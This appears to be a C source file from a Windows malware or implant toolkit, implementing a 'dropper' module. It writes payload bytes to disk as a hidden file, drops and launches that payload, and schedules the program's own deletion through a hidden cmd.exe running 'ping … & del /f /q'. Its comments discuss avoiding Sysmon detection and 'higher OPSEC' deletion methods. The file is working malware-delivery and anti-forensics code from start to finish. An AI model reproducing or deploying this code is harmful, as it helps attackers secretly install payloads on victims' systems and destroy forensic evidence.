#include "../../include/utils/dropper.h"
#include "../../include/utils/thread.h"
#include <stdio.h>
#include <string.h>

//////////////////////////////////////////////////////////////
// File Drop /////////////////////////////////////////////////
//////////////////////////////////////////////////////////////

/**
 * Write raw bytes to a file on disk.
 *
 * CreateFileA is used instead of fopen/fwrite to:
 *   - Set FILE_ATTRIBUTE_HIDDEN on creation without a separate SetFileAttributes
 *     call (dwFlagsAndAttributes controls both sharing and attributes).
 *   - Avoid the CRT FILE* abstraction and any buffering it introduces.
 *
 * The file is created with:
 *   CREATE_ALWAYS    — overwrite if it already exists
 *   FILE_ATTRIBUTE_HIDDEN — not visible in default Explorer / dir views
 */
int drop_binary(const char *destPath, const BYTE *data, SIZE_T size) {
  if (!destPath || !data || size == 0) {
    pretty_print(LOG_ERROR, "drop_binary: invalid parameters");
    return -1;
  }

  HANDLE hFile = CreateFileA(
      destPath,
      GENERIC_WRITE,                    // Write-only access
      0,                                // No sharing — exclusive write
      NULL,                             // Default security attributes
      CREATE_ALWAYS,                    // Create or overwrite
      FILE_ATTRIBUTE_HIDDEN,            // Hide from default listings
      NULL                              // No template file
  );

  if (hFile == INVALID_HANDLE_VALUE) {
    pretty_print(LOG_ERROR, "drop_binary: CreateFileA('%s') failed: %lu",
                 destPath, GetLastError());
    return -1;
  }

  DWORD written = 0;

  // WriteFile handles sizes up to MAXDWORD per call; split if size > 4 GiB.
  // For typical payloads this single call is always sufficient.
  if (!WriteFile(hFile, data, (DWORD)size, &written, NULL) ||
      written != (DWORD)size) {
    pretty_print(LOG_ERROR,
                 "drop_binary: WriteFile incomplete (%lu/%zu bytes): %lu",
                 written, size, GetLastError());
    CloseHandle(hFile);
    return -1;
  }

  CloseHandle(hFile);
  pretty_print(LOG_SUCCESS, "drop_binary: wrote %zu bytes → %s", size,
               destPath);
  return 0;
}

//////////////////////////////////////////////////////////////
// Drop + Execute ////////////////////////////////////////////
//////////////////////////////////////////////////////////////

int drop_and_execute(const char *destPath, const BYTE *data, SIZE_T size,
                     const char *args, DWORD *slot) {
  if (drop_binary(destPath, data, size) != 0)
    return -1;
  return spawn_binary(destPath, args, slot);
}

//////////////////////////////////////////////////////////////
// Path Resolution ///////////////////////////////////////////
//////////////////////////////////////////////////////////////

int resolve_temp_path(const char *filename, char *buf, SIZE_T bufSize) {
  if (!filename || !buf || bufSize == 0) {
    return -1;
  }

  char tmp[MAX_PATH];
  DWORD len = GetTempPathA((DWORD)sizeof(tmp), tmp);
  if (len == 0 || len >= sizeof(tmp)) {
    pretty_print(LOG_ERROR, "resolve_temp_path: GetTempPathA failed: %lu",
                 GetLastError());
    return -1;
  }

  // GetTempPathA always appends a trailing backslash
  int needed = snprintf(buf, bufSize, "%s%s", tmp, filename);
  if (needed < 0 || (SIZE_T)needed >= bufSize) {
    pretty_print(LOG_ERROR,
                 "resolve_temp_path: buffer too small (%zu bytes needed)",
                 (SIZE_T)needed + 1);
    return -1;
  }

  return 0;
}

//////////////////////////////////////////////////////////////
// Self-Delete ///////////////////////////////////////////////
//////////////////////////////////////////////////////////////

/**
 * Schedule own-executable deletion via a detached cmd.exe child.
 *
 * The command spawned (with STARTF_USESHOWWINDOW | SW_HIDE) is:
 *   cmd /c ping -n 3 127.0.0.1 >nul & del /f /q "<path>"
 *
 * The ping delay (~3 s) gives the caller enough time to exit and release
 * the file handle before cmd.exe attempts the delete. The process is
 * created with CREATE_NO_WINDOW so no console flashes.
 *
 * Note: this approach is forensically trivial to spot in Sysmon Event 1
 * (process create with "del" in the commandline) if process auditing is
 * enabled. For higher OPSEC, use MoveFileExA(path, NULL,
 * MOVEFILE_DELAY_UNTIL_REBOOT) to register a pending delete on next boot,
 * or overwrite the file with zeros before deleting.
 */
int self_delete(const char *path) {
  if (!path) {
    pretty_print(LOG_ERROR, "self_delete: invalid parameters");
    return -1;
  }

  const char *comspec = getenv("COMSPEC");
  if (!comspec || !*comspec)
    comspec = "cmd.exe";

  char cmdline[32767];
  int n = snprintf(cmdline, sizeof(cmdline),
                   "\"%s\" /c ping -n 3 127.0.0.1 >nul & del /f /q \"%s\"",
                   comspec, path);
  if (n < 0 || (size_t)n >= sizeof(cmdline)) {
    pretty_print(LOG_ERROR, "self_delete: command line too long");
    return -1;
  }

  STARTUPINFOA si;
  PROCESS_INFORMATION pi;
  memset(&si, 0, sizeof(si));
  memset(&pi, 0, sizeof(pi));
  si.cb = sizeof(si);
  si.dwFlags = STARTF_USESHOWWINDOW;
  si.wShowWindow = SW_HIDE;

  BOOL ok = CreateProcessA(NULL, cmdline, NULL, NULL, FALSE,
                           CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP,
                           NULL, NULL, &si, &pi);
  if (!ok) {
    pretty_print(LOG_ERROR, "self_delete: CreateProcessA failed: %lu",
                 GetLastError());
    return -1;
  }

  // We do NOT wait — the whole point is that cmd outlives us.
  // Close our copies of the handles immediately; the process keeps running.
  CloseHandle(pi.hThread);
  CloseHandle(pi.hProcess);

  pretty_print(LOG_SUCCESS, "self_delete: cleanup scheduled for '%s'", path);
  return 0;
}
